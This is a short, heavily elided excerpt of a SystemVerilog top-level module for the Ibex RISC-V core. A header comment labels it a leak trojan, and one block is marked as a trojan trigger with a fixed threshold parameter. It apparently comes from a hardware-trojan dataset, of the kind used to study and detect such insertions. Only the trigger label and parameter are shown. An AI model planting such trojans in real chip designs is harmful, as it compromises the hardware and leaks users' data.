...
/**
 * Top level module of_trojan_Leak the ibex RISC-V core with tracing enabled
 */
...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  `ifndef RVFI
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=12825)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12825;
